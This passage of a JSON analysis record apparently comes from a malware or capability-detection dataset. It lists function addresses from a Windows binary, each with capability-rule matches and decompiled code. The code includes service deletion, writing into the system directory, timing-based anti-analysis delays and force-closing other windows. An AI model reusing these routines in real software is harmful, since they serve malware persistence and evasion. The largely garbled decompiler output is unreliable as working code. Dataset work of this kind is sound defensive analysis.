        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040162d) overlaps instruction at (ram,0x00401624)\n// \n\nchar * __cdecl fcn.004015f0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *unaff_EDI;\n    char *pcVar5;\n    bool bVar6;\n    \n    bVar6 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar3 = (arg_8h - arg_14h) + arg_ch;\n    if ((bVar6 == pcVar3 < 0) && (bVar6 != pcVar3 < 0)) {\n        bVar6 = pcVar3 < 0x5b74ff85;\n        pcVar1 = pcVar3;\n        pcVar3 = arg_8h;\n    }\n    else {\n        bVar6 = false;\n        pcVar1 = arg_8h;\n        if (arg_14h == 0) {\n            return arg_8h;\n        }\n    }\n    pcVar5 = arg_10h;\n    if ((!bVar6) && (bVar6)) {\n        *(arg_ch + 0x43d1773a) = *(arg_ch + 0x43d1773a) ^ 0x3b27e95e;\n        return pcVar1 + !bVar6 + 0x7c8ecb0d;\n    }\n    do {\n        if (pcVar3 < pcVar1) {\n            return NULL;\n        }\n        if ((pcVar3 < pcVar1) && (pcVar1 <= pcVar3)) {\n            pcVar5 = unaff_EDI;\n        }\n        if (*pcVar1 == *pcVar5) {\n            bVar6 = true;\n            iVar2 = arg_14h;\n            pcVar4 = pcVar1;\n            do {\n                pcVar5 = pcVar5 + 1;\n                pcVar4 = pcVar4 + 1;\n                iVar2 = iVar2 + -1;\n                if (iVar2 == 0) break;\n                bVar6 = *pcVar4 == *pcVar5;\n            } while (bVar6);\n            pcVar5 = arg_10h;\n            if (bVar6) {\n                return pcVar1;\n            }\n        }\n        pcVar1 = pcVar1 + 1;\n    } while( true );\n}\n",
        "token_count": 569
    },
    "00401720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "contain pusha popa sequence",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401720(uint filename, uint stream, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CH;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    while( true ) {\n        (*_sym.imp.MSVCRT.dll_fwrite)();\n        bVar2 = false;\n        bVar4 = false;\n        bVar3 = (extraout_CH | 0x47) == 0;\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        if ((bVar2 || bVar3) || (!bVar2 && !bVar3)) break;\n        if (!bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 258
    },
    "00401c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401c3e)\n// WARNING: Removing unreachable block (ram,0x00401c47)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401c20(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401a60(&var_68h, &var_4h);\n    fcn.00404c30(&var_68h, var_4h, 0x407014, 0xa0c0);\n    *arg_8h = 0x407014;\n    *arg_ch = 0xa0c0;\n    return;\n}\n",
        "token_count": 290
    },
    "00401cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401cb0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00401ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401ea0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405210;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4224c8);\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    uVar1 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x4224d4);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, uVar1, 0, 0, 2, 1000, &var_18h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x4224e8);\n    if (pcVar2 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar3 = (*pcVar2)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar3 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar3 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((-1 < iVar3) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar3 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar3 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004022c3:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x004022cf:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar3 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar3 < 0) || (var_10h == NULL)) ||\n                       (iVar3 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar3 < 0)) {\njoined_r0x0040228a:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x004022cf;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004020c6:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00401cb0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4224fc);\n                        if (iVar4 != 0) goto joined_r0x004020c6;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar3 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar3 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040226f:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004022c3;\n                        }\n                        iVar3 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar3 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040226f;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00401cb0(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.00401de0(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040228a;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar3;\n}\n",
        "token_count": 2386
    },
    "004023d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004023fe) overlaps instruction at (ram,0x004023fb)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004023d0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint *unaff_EBX;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint *puVar4;\n    bool bVar5;\n    uchar var_108h;\n    uint *var_107h;\n    uint uStack260;\n    uint uStack256;\n    uint *puStack252;\n    uint var_4h;\n    \n    bVar5 = (POPCOUNT(&stack0xfffffef4 & 0xff) & 1U) != 0;\n    puVar3 = &stack0xfffffffc;\n    if ((bVar5) && (puVar3 = &stack0xfffffffc,  !bVar5)) {\n        puVar3 = *0x8b17b43a;\n        arg_8h = 0x34a96cf4;\n        if (in_EDX != -1) {\n            *(stack0xfffffef8 + 0x458b0c4d) = *(stack0xfffffef8 + 0x458b0c4d) + uStack256;\n            puVar3 = unaff_EBX;\n            arg_8h = unaff_ESI;\n        }\n    }\n    puStack252 = puVar3 + -1;\n    uStack260 = 0x402401;\n    uStack256 = arg_8h;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (puVar3[3] != puVar3[-1]) {\n        return 1;\n    }\n    *(puVar3 + -0x42) = 0;\n    puVar4 = puVar3 + -0x107;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    unique0x00001e00 = puVar3 + -0x42;\n    uStack260 = 0x104;\n    *(puVar4 + 2) = 0;\n    _var_108h = arg_8h;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar3 + -0x42);\n    bVar5 = iVar2 != 0;\n    if (!bVar5) {\n        if ((bVar5) && (!bVar5)) {\n            puVar4 = &stack0xfffffef0;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n        }\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x402350, 0);\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 807
    },
    "004027d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027f1) overlaps instruction at (ram,0x004027ec)\n// \n\nvoid __cdecl fcn.004027d0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t in_CL;\n    uint32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    uint32_t uVar2;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    uint32_t uVar3;\n    \n    if (((!in_ZF && in_OF == in_SF) && (uVar2 = unaff_EDI,  in_ZF || in_OF != in_SF)) ||\n       (uVar2 = 0,  unaff_EBX = arg_ch,  arg_ch != 0)) {\n        do {\n            unaff_EBX = unaff_EBX + 1;\n            *(in_EAX + -0x74c625aa) = *(in_EAX + -0x74c625aa) ^ in_CL;\n            *(unaff_EDI + 0x513c76db) = *(unaff_EDI + 0x513c76db) + 1;\n            uVar3 = unaff_ESI;\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_CL = 0x1a;\n            in_EAX = *(unaff_EDI + 8);\n            *(uVar2 + in_EAX) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n            unaff_EDI = uVar3;\n        } while (uVar2 < unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "00402840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402840(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool in_PF;\n    uint uStack16;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((!in_PF) && (in_PF)) {\n        puVar5 = &uStack16;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    uStack16 = 0xf003f;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0);\n    uVar3 = fcn.00402720(uVar2, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n    return uVar3;\n}\n",
        "token_count": 264
    },
    "00403800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004038d1) overlaps instruction at (ram,0x004038ce)\n// \n// WARNING: Removing unreachable block (ram,0x0040389d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403800(uint32_t *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    int32_t in_EAX;\n    uint32_t *puVar7;\n    uint8_t *in_ECX;\n    int32_t *in_EDX;\n    uint unaff_EBX;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    uint8_t in_CF;\n    bool in_PF;\n    uint8_t in_AF;\n    bool bVar8;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    uint var_68h;\n    uint uStackY32;\n    uint32_t *in_stack_ffffffec;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\ncode_r0x0040380e:\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar5 = in_EAX - 1U;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar5 = uVar5 + in_AF * '\\x06';\n        uVar5 = uVar5 + (0x90 < (uVar5 & 0xf0) | in_CF | in_AF * (0xf9 < uVar5)) * '`';\n        pcVar4 = in_EAX - 1U & 0xffffff00 | uVar5;\n        *in_EDX = *in_EDX + 0x458bdf84;\n        pcVar1 = (in_EDX & 0xffff0000 | CONCAT11(in_EDX >> 8 | uVar5, in_EDX)) + 0xf;\n        *pcVar1 = *pcVar1 + (unaff_EBX >> 8);\n        *pcVar4 = *pcVar4 + uVar5;\n        pcVar4[0x66] = pcVar4[0x66] + in_EDX;\n        *0xf58ea42 = *0xf58ea42 + 'B';\n        puVar2 = unaff_EDI + 0x58;\n        uVar5 = *puVar2;\n        *puVar2 = *puVar2 - 0x16;\n        in_EDX = 0xb7bc9ea5;\n        if (0x15 >= uVar5) {\n            if ((POPCOUNT(*puVar2) & 1U) == 0) {\n                *in_ECX = *in_ECX + 0x42 + (0x15 < uVar5);\n                uVar5 = in_ECX >> 8;\n                bVar8 = CARRY1(*0xf58ea16, uVar5);\n                *0xf58ea16 = *0xf58ea16 + uVar5;\n                *in_ECX = *in_ECX + 0x42 + bVar8;\n                uStackY32 = 0x4037de;\n                fcn.00404c30(&fcn.00403800::var_68h, 0xb7bc9ea5, in_stack_ffffffec, unaff_EBX);\n                *arg_8h = 0x4110d4;\n                *arg_ch = 0x11000;\n                return;\n            }\n            in_CF = 0;\n            in_OF = '\\0';\n            in_SF = &stack0xfffffff4 < 0;\n            in_PF = (POPCOUNT(&stack0xfffffff4 & 0xff) & 1U) == 0;\n            puVar7 = 0xffffea42;\n            in_ST0 = in_ST1;\n            goto code_r0x00403845;\n        }\n        puVar7 = 0xf58ea43;\ncode_r0x00403864:\n        in_CF = CARRY4(unaff_EDI, *puVar7);\n        in_OF = SCARRY4(unaff_EDI, *puVar7);\n        unaff_EDI = unaff_EDI + *puVar7;\n        in_SF = unaff_EDI < 0;\n    }\n    else {\n        *arg_8h = 0x7a;\n        puVar7 = arg_8h;\n        if ((!in_PF) && (in_PF)) {\n            piVar3 = segment(in_SS, *0x10 + -0x10);\n            in_EAX = *piVar3;\n            in_stack_ffffffec = arg_8h;\n            goto code_r0x0040380e;\n        }\ncode_r0x00403845:\n        in_ST1 = in_ST0;\n        *(puVar7 + 1) = 0xba;\n        if ((in_PF) || (!in_PF)) {\n            *(puVar7 + 2) = 0x11;\n        }\n        else {\n            uVar5 = in_EDX;\n            in_CF = CARRY1(uVar5, *in_ECX);\n            in_OF = SCARRY1(uVar5, *in_ECX);\n            uVar5 = uVar5 + *in_ECX;\n            in_EDX = in_EDX & 0xffffff00 | uVar5;\n            in_SF = uVar5 < '\\0';\n            in_PF = (POPCOUNT(uVar5) & 1U) == 0;\n        }\n        if ((!in_PF) && (in_PF)) goto code_r0x00403864;\n        *(puVar7 + 3) = 0x38;\n    }\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(puVar7 + -0x1f3a4905) = in_ST1;\n        uVar6 = puVar7 + -1;\n        uVar5 = 9 < (uVar6 & 0xf) | in_AF;\n        uVar6 = uVar6 + uVar5 * '\\x06';\n        *in_EDX = *in_EDX + 0x40c6df84;\n        puVar7 = puVar7 + -1 & 0xffffff00 |\n                 (uVar6 + (0x90 < (uVar6 & 0xf0) | in_CF | uVar5 * (0xf9 < uVar6)) * '`') - 0x15;\n    }\n    else {\n        *(puVar7 + 1) = 0xeb;\n    }\n    *(puVar7 + 5) = 0x4c;\n    *(puVar7 + 6) = 0xe9;\n    bVar8 = (in_ECX - 1U & unaff_EDI | 0x61be) != 0;\n    *(puVar7 + 7) = 0x47;\n    if (bVar8) {\n        if (!bVar8) goto code_r0x004038ca;\n    }\n    *(puVar7 + 2) = 0x42;\ncode_r0x004038ca:\n    *(in_EDX + 0x52) = *(in_EDX + 0x52) | puVar7;\n    *(puVar7 + 9) = 0xfe;\n    *(arg_8h + 10) = 0xf0;\n    *(arg_8h + 0xb) = 0x1e;\n    *(arg_8h + 3) = 0x34;\n    *arg_ch = 0xd;\n    return;\n}\n",
        "token_count": 1729
    },
    "00403fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403fc0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    int32_t arg_8h_00;\n    float10 extraout_ST0;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00403d30(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (-1 < iVar1) {\n        if (-1 >= iVar1) {\n            *(arg_8h_00 + 0x1c) = extraout_ST0;\n            arg_8h_00 = arg_8h_00 + 5;\n            arg_ch_00 = arg_ch_00 + 5;\n        }\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00403d30(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 255
    },
    "004043e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404430) overlaps instruction at (ram,0x0040442e)\n// \n\nuint32_t __fastcall fcn.004043e0(uint32_t param_1, ushort param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBX;\n    uchar *puVar5;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    bool bVar6;\n    bool in_ZF;\n    uint uStack24;\n    uint uStack20;\n    \n    if ((in_ZF) || (!in_ZF)) {\n        uStack20 = param_4;\n        uStack24 = param_3;\n        in_EAX = param_4;\n        param_1 = param_3;\n    }\n    else {\n        iVar4 = in(param_2);\n        *unaff_EDI = iVar4;\n        unaff_EDI = unaff_EDI + 1;\n        if (&stack0xfffffff4 < 1) {\n            puVar5 = &uStack20 + 3;\n            bVar6 = &uStack20 + 3 < 0x10c;\n            uStack24 = uStack24 & 0xffffff | 0x4000000;\n            uStack20 = 0xfc000001;\n            if ((bVar6) || (!bVar6)) {\n                iVar4 = &uStack24 + 3;\n            }\n            else {\n                iVar4 = in_EAX + 0x7c8ecb0d + !bVar6;\n                *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8d27e95e;\n                puVar5 = &stack0xfffffff0;\n            }\n            iVar4 = fcn.00404510(0x80000002, 0x4223c0, 0x422400, puVar5 + -8, puVar5 + -0x10c, iVar4);\n            if (iVar4 != 0) {\n                iVar4 = (*_sym.imp.MSVCRT.dll__access)(puVar5 + -0x10c, 0);\n                return iVar4 != -1;\n            }\n            return 0;\n        }\n    }\n    uVar3 = in_EAX ^ 0xdee0ed6d;\n    uVar3 = uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31;\n    *(unaff_EBX + 0x4d8b0c45) = *(unaff_EBX + 0x4d8b0c45) ^ param_1;\n    puVar1 = uVar3 - 1;\n    *puVar1 = *puVar1 | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    pcVar2 = uVar3 + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar4 != 0) {\n        *(unaff_EDI + 0x56) = *(unaff_EDI + 0x56) - &uStack24;\n        uVar3 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 826
    },
    "004045b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004045b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403b90(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "004045f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004045f0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "004046d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040472c) overlaps instruction at (ram,0x00404727)\n// \n// WARNING: Removing unreachable block (ram,0x004047e7)\n// WARNING: Removing unreachable block (ram,0x00404717)\n// WARNING: Removing unreachable block (ram,0x0040472c)\n// WARNING: Variable defined which should be unmapped: var_20fh\n\nuint __cdecl fcn.004046d0(uint arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    ushort extraout_DX;\n    uchar *unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    uint noname_3;\n    uchar *noname_4;\n    uint arg_8h_00;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    puVar3 = &var_20fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    s = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    noname_4 = &lpBuffer;\n    // WARNING: Could not recover jumptable at 0x0040472c. Too many branches\n    // WARNING: Treating indirect jump as call\n    arg_8h_00 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4220f4, &lpBuffer, arg_8h);\n    fcn.00403770(&var_4h, &var_8h);\n    uVar1 = puVar3 + 0x2565;\n    bVar4 = (uVar1 & 0xffffff00 | uVar1 | 0x4c | extraout_ECX) == 0;\n    noname_3 = var_4h;\n    fcn.00404810(var_4h);\n    if ((!bVar4) && (bVar4)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    iVar2 = fcn.00404aa0(&s, var_4h, var_8h, noname_3, noname_4, arg_8h_00, unaff_EDI, _lpBuffer);\n    if (iVar2 != 0) {\n        fcn.00403a40(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 727
    },
    "00404c30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
